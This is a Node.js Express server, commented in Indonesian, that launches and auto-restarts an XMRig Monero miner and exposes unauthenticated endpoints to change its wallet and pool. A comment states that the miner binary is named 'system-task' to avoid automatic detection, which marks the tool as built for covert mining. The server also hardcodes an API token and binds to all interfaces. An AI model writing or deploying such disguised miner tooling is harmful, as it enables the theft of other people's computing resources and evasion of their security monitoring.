const { spawn } = require('child_process');
const express = require('express');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 5136;

// Simpan log terakhir
let logs = [];
const MAX_LOGS = 100;

// Set ke false untuk menggunakan XMRig asli
const MOCK_MODE = false;

// Konfigurasi XMRig
const isWindows = process.platform === 'win32';
// Nama biner disamarkan untuk menghindari deteksi otomatis
const XMRIG_BINARY = isWindows ? 'system-task.exe' : 'system-task'; 
const XMRIG_PATH = path.join(__dirname, XMRIG_BINARY);
const XMRIG_API_URL = 'http://127.0.0.1:44445/1/summary';
const XMRIG_TOKEN = 'secret123';

let xmrigProcess = null;
let autoRestart = true;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Handler untuk menangkap error yang tidak terduga agar server tidak langsung mati
process.on('uncaughtException', (err) => {
    console.error(`[CRITICAL] Uncaught Exception: ${err.message}`);
    console.error(err.stack);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error(`[CRITICAL] Unhandled Rejection at: ${promise}, reason: ${reason}`);
});

// Endpoint untuk mendapatkan config saat ini
app.get('/api/config', (req, res) => {
    const configPath = path.join(__dirname, 'config.json');
    try {
        const configData = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        res.json({
            wallet: configData.pools[0].user,
            pool: configData.pools[0].url
        });
    } catch (error) {
        res.status(500).json({ error: 'Gagal mengambil konfigurasi' });
    }
});

// Endpoint untuk menyimpan config wallet
app.post('/api/config', (req, res) => {
    const { wallet, pool } = req.body;
    const configPath = path.join(__dirname, 'config.json');
    try {
        let configData = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        if (wallet) configData.pools[0].user = wallet;
        if (pool) configData.pools[0].url = pool;
        fs.writeFileSync(configPath, JSON.stringify(configData, null, 4));
        res.json({ message: 'Konfigurasi berhasil disimpan' });
    } catch (error) {
        res.status(500).json({ error: 'Gagal menyimpan konfigurasi' });
    }
});

// Endpoint untuk mendapatkan logs
app.get('/api/logs', (req, res) => {
    res.json({ logs });
});

function startMiner(res = null) {
    if (xmrigProcess) {
        if (res) res.json({ message: 'XMRig sudah berjalan' });
        return;
    }

    const configPath = path.join(__dirname, 'config.json');
    if (!fs.existsSync(XMRIG_PATH)) {
        if (res) res.status(404).json({ error: `File binary '${XMRIG_BINARY}' tidak ditemukan.` });
        return;
    }

    try {
        if (!isWindows) {
            try { require('child_process').execSync(`chmod +x ${XMRIG_PATH}`); } catch (e) {}
        }

        logs = [];
        xmrigProcess = spawn(XMRIG_PATH, ['-c', configPath], {
            cwd: path.dirname(XMRIG_PATH),
            detached: false
        });

        const addLog = (data) => {
            const line = data.toString().trim();
            if (line) {
                logs.push(`[${new Date().toLocaleTimeString()}] ${line}`);
                if (logs.length > MAX_LOGS) logs.shift();
            }
        };

        xmrigProcess.stdout.on('data', addLog);
        xmrigProcess.stderr.on('data', addLog);

        xmrigProcess.on('close', (code) => {
            const msg = `[SYSTEM] XMRig berhenti dengan kode: ${code}`;
            console.log(msg);
            logs.push(msg);
            xmrigProcess = null;
            if (autoRestart) {
                const restartMsg = `[SYSTEM] Mencoba menjalankan ulang dalam 60 detik...`;
                logs.push(restartMsg);
                setTimeout(() => startMiner(), 60000);
            }
        });

        if (res) res.json({ message: 'XMRig berhasil dijalankan' });
    } catch (error) {
        if (res) res.status(500).json({ error: 'Gagal menjalankan XMRig.' });
    }
}

app.post('/api/start', (req, res) => {
    autoRestart = true;
    startMiner(res);
});

app.post('/api/stop', (req, res) => {
    autoRestart = false;
    if (xmrigProcess) {
        xmrigProcess.kill();
        xmrigProcess = null;
        return res.json({ message: 'XMRig dihentikan' });
    }
    res.json({ message: 'XMRig tidak sedang berjalan' });
});

app.get('/api/status', async (req, res) => {
    try {
        const response = await axios.get(XMRIG_API_URL, { 
            timeout: 1000,
            headers: { 'Authorization': `Bearer ${XMRIG_TOKEN}` }
        });
        res.json({ ...response.data, isRunning: !!xmrigProcess });
    } catch (error) {
        if (MOCK_MODE) return res.json({ ...getMockData(), isRunning: false });
        res.json({ error: 'XMRig API tidak merespon.', isRunning: !!xmrigProcess });
    }
});

function getMockData() {
    return {
        hashrate: { total: [1200.5, 1150.2, 1100.0] },
        results: { hashes_total: 50000, accepted: 120, rejected: 2 },
        uptime: 3600,
        cpu: { brand: "Simulated CPU", aes: true },
        algo: "rx/0",
        version: "6.21.0",
        connection: { pool: "mock-pool.com:3333" }
    };
}

app.listen(port, '0.0.0.0', () => {
    console.log(`XMRig Web Dashboard berjalan di port ${port}`);
    setInterval(() => {
        const memUsage = process.memoryUsage();
        const rss = Math.round(memUsage.rss / 1024 / 1024 * 100) / 100;
        console.log(`[HEARTBEAT] Server aktif - RAM: ${rss}MB - ${new Date().toLocaleTimeString()}`);
    }, 60000);
});
